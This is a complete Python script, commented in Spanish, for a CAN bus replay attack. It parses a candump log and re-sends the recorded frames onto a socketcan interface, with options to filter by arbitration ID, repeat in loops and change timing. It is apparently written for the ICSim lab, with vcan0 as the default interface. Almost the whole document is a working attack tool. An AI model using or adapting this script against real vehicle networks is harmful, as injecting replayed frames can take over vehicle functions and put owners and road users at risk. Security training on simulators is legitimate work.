#!/usr/bin/env python3
"""
replay_attack.py — Ataque de replay sobre bus CAN.

Lee un log de candump y reproduce las tramas en el bus indicado,
opcionalmente filtrando por Arbitration ID y ajustando velocidad.

Uso:
    python replay_attack.py --file logs/secuencia_grabada.log --interface vcan0
    python replay_attack.py --file logs/captura.log --interface vcan0 --filter-id 0x19B --loops 3

Dependencias: python-can (pip install python-can)
"""

import can
import argparse
import time
import re
import sys

# Expresión regular para el formato de candump:
# (timestamp) interface ID#data
_LOG_PATTERN = re.compile(
    r"^\s*\((?P<ts>\d+\.\d+)\)\s+\S+\s+(?P<id>[0-9A-Fa-f]+)#(?P<data>[0-9A-Fa-f]*)"
)


def parse_log(filepath: str, filter_id: int | None) -> list[tuple[float, can.Message]]:
    """Parsea un log de candump y devuelve lista de (timestamp, Message)."""
    frames: list[tuple[float, can.Message]] = []

    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            m = _LOG_PATTERN.match(line)
            if not m:
                continue
            ts = float(m.group("ts"))
            aid = int(m.group("id"), 16)
            raw_data = m.group("data")
            data_bytes = bytes.fromhex(raw_data) if raw_data else b""

            if filter_id is not None and aid != filter_id:
                continue

            msg = can.Message(
                arbitration_id=aid,
                data=data_bytes,
                is_extended_id=False,
            )
            frames.append((ts, msg))

    return frames


def replay(
    frames: list[tuple[float, can.Message]],
    interface: str,
    loops: int,
    speed_factor: float,
) -> None:
    """Reproduce la lista de frames en el bus CAN."""
    if not frames:
        print("[!] No hay tramas que reproducir (log vacío o filtro demasiado restrictivo).")
        return

    try:
        bus = can.interface.Bus(channel=interface, bustype="socketcan")
    except Exception as e:
        print(f"[!] Error al abrir {interface}: {e}")
        sys.exit(1)

    total_sent = 0
    base_ts = frames[0][0]

    print(f"[*] Reproduciendo {len(frames)} trama(s) × {loops} iteración(es)...")
    print(f"    Velocidad: ×{speed_factor:.1f}  |  Interfaz: {interface}\n")

    try:
        for loop in range(loops):
            replay_start = time.monotonic()
            print(f"  [Loop {loop + 1}/{loops}]")
            for original_ts, msg in frames:
                # Calcular el tiempo relativo desde el inicio del loop
                relative_ts = (original_ts - base_ts) / speed_factor
                # Esperar hasta que sea el momento correcto
                elapsed = time.monotonic() - replay_start
                wait = relative_ts - elapsed
                if wait > 0:
                    time.sleep(wait)
                bus.send(msg)
                total_sent += 1

    except KeyboardInterrupt:
        print("\n[!] Replay interrumpido.")
    finally:
        bus.shutdown()

    print(f"\n[+] Replay completado. Tramas enviadas: {total_sent}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Ataque de replay CAN — ICSim Lab"
    )
    parser.add_argument(
        "--file", "-f", required=True, help="Archivo de log de candump"
    )
    parser.add_argument(
        "--interface", "-i", default="vcan0", help="Interfaz CAN (default: vcan0)"
    )
    parser.add_argument(
        "--filter-id",
        type=lambda x: int(x, 16),
        default=None,
        metavar="HEX_ID",
        help="Filtrar por Arbitration ID (hex, ej: 0x19B)",
    )
    parser.add_argument(
        "--loops",
        "-l",
        type=int,
        default=1,
        help="Número de repeticiones del replay (default: 1)",
    )
    parser.add_argument(
        "--speed",
        "-s",
        type=float,
        default=1.0,
        metavar="FACTOR",
        help="Factor de velocidad (1.0=normal, 2.0=doble) (default: 1.0)",
    )
    args = parser.parse_args()

    frames = parse_log(args.file, args.filter_id)
    print(f"[+] Log cargado: {len(frames)} trama(s) {'(todas)' if args.filter_id is None else f'(ID=0x{args.filter_id:03X})'}")

    replay(frames, args.interface, args.loops, args.speed)


if __name__ == "__main__":
    main()
